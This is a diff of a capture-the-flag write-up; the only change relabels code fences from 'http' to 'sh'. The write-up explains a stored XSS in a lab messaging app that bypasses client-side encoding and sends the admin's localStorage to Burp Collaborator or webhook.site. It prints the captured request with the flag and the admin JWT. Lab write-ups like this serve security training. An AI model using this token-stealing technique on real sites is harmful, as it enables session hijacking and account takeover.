@@ -12,7 +12,7 @@ We come across an interesting messaging feature. Since our sent message isn't di
 When sending our first message we note that as the recipient user our XSS payload is HTML encoded so the payload does not execute. Let's capture a second message attempt in our proxy and see what is going on.
 
 The message is HTML encoded from the front end, so let's change things and see if the back end is doing the same:
-```http
+```sh
 POST /api/messages HTTP/2
 Host: ce8b534ae29f.labs.bugforge.io
 Content-Length: 80
@@ -36,7 +36,7 @@ Priority: u=1, i
 ```
 
 ### Edited Request
-```http
+```sh
 POST /api/messages HTTP/2
 Host: ce8b534ae29f.labs.bugforge.io
 Content-Length: 64
@@ -65,7 +65,7 @@ We have success:
 Let's try grabbing local storage of the Admin user since the app is not using cookies but rather JWT's.
 
 We will send a message and intercept our payload to undo the HTML encoding. I went with the following payload using collaborator, but if you don't have Burp pro, [webhook.site](https://webhook.site/#!/view/ca96bb9d-44b6-4088-bdaa-c2dd271a7e5c) will work just fine:
-```http
+```sh
 POST /api/messages HTTP/2
 Host: ce8b534ae29f.labs.bugforge.io
 Content-Length: 172
@@ -90,7 +90,7 @@ Priority: u=1, i
 - Remember since we are adding our payload in JSON we will need to properly escape any double quotes.
 
 Shortly after sending our payload to the admin we get an HTTP request in collaborator:
-```http
+```sh
 GET /?ls=%7B%22flag%22%3A%22bug%7B902c30d950de5e7cc9cf4a071d9af9ef%7D%22%2C%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc2NDYzNTMyNn0.
 s60iliLmV9t1YsKDsXEOsXOHyWhOAVL4rsAiRHJ33dc%22%2C%22user%22%3A%22%7B%5C%22id%5C%22%3A2%2C%5C%22username%5C%22%3A%5C%22admin%5C%22%2C%5C%22email%5C%22%3A%5C%22admin%40ottergram.com%5C%22%2C%
 5C%22full_name%5C%22%3A%5C%22Admin%20User%5C%22%2C%5C%22bio%5C%22%3A%5C%22Ottergram%20Administrator%5C%22%2C%5C%22profile_picture%5C%22%3A%5C%22%2Fuploads%2Fotter2.png%5C%22%2C%5C%22role%5C
@@ -109,7 +109,7 @@ Accept-Language: en-US,en;q=0.9
 ```
 
 URL decoded we can see our flag along with the admins token:
-```http
+```sh
 GET /?ls={"flag":"bug{902c30d950de5e7cc9cf4a071d9af9ef}","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc2NDYzNTMyNn0.s60iliLmV9t1YsKDsXEOsXOHyWhOAV
 L4rsAiRHJ33dc","user":"{\"id\":2,\"username\":\"admin\",\"email\":\"admin@ottergram.com\",\"full_name\":\"Admin User\",\"bio\":\"Ottergram Administrator\",\"profile_picture\":\"/uploads/otter2.
 png\",\"role\":\"admin\"}"}
